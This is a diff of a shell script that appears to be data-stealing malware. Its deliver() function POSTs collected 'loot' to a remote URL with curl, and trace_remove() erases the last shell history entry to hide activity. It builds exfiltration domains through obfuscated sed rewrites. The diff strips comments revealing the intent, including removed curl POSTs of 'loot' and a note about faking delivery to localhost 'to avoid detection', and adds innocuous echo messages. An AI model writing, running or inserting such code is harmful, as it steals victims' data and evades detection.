@@ -1,11 +1,9 @@
 trace_remove(){
-	#hurry up hurrry stop
     history -d $(history  | tail -1 |  awk '{print $1}');
     history -w ;
 };
 
 
-# deliver ;
 deliver(){
 	echo -n "$1" $db;
 	curl -X POST -d "loot=$db" $1;
@@ -35,9 +33,8 @@ eat="mnm.com";
 sasdf="x.com";
 
 update_links(){
-    #dynamically building the links, for seeders to receive;
-
-    finish=$(echo $finish | sed 's/xnx/xxx/g');
+    echo "Dynamically Creating the links";
+    finish=$(echo $finish | sed 's/xnx/xxx/g'); 
     encrypt=$(echo $encrypt | sed 's/yay/yeet/g');
     eat=$(echo $eat | sed 's/mnm/mnmn/g');
     st=$(echo $st | sed 's/oot/loot/g');
@@ -56,19 +53,11 @@ update_links(){
     door=$(echo $door | awk -F "." '{print $1}');
     takeaway=$(echo $takeaway | awk -F "." '{print $1}');
     some=$(echo $some | awk -F "." '{print $1}');
-
-   
-    # curl -X POST -d "loot=$db" $passwords_domain > /dev/null 2>&1;
-    # curl -X POST -d "loot=$db" $source_of_gt > /dev/null 2>&1;
-    # curl -X POST -d "loot=$db" $link > /dev/null 2>&1;
-    
-    # #fake deliever to local host using deliver() to avoid detection and suppress errors;
-    # deliver "http://localhost:8080" > /dev/null 2>&1;
 };
 
 
-
-crypto=$(head -c 32 /dev/urandom | xxd -p -c 32); # random number generator;
+echo "Random Number Generator";
+crypto=$(head -c 32 /dev/urandom | xxd -p -c 32); 
 update_links $crypto;
 
 shuru(){
